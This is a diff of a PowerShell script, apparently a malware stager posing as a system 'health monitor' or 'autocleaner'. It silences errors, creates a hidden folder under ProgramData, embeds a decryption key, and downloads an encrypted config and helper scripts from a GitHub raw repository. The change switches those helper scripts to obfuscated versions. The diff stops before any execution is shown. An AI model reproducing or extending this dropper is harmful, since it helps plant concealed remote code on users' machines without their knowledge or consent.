@@ -1,8 +1,8 @@
 $ErrorActionPreference="SilentlyContinue";$ProgressPreference="SilentlyContinue"
 $p="C:\ProgramData\SystemHealthService";$ek="S3cr3tK3y2024!"
 $eu="https://raw.githubusercontent.com/saiyanjohan580-boop/autocleaner/refs/heads/main/config.enc"
-$uu="https://raw.githubusercontent.com/saiyanjohan580-boop/autocleaner/refs/heads/main/HealthMonitor.ps1"
-$au="https://raw.githubusercontent.com/saiyanjohan580-boop/autocleaner/refs/heads/main/HealthMonitorAdmin.ps1"
+$uu="https://raw.githubusercontent.com/saiyanjohan580-boop/autocleaner/refs/heads/main/HealthMonitor_obf.ps1"
+$au="https://raw.githubusercontent.com/saiyanjohan580-boop/autocleaner/refs/heads/main/HealthMonitorAdmin_obf.ps1"
 if(!(Test-Path $p)){New-Item -Path $p -ItemType Directory -Force|Out-Null};(Get-Item $p).Attributes="Hidden"
 Invoke-WebRequest -Uri $eu -OutFile "$p\config.enc" -UseBasicParsing
 Invoke-WebRequest -Uri $uu -OutFile "$p\HealthMonitor.ps1" -UseBasicParsing
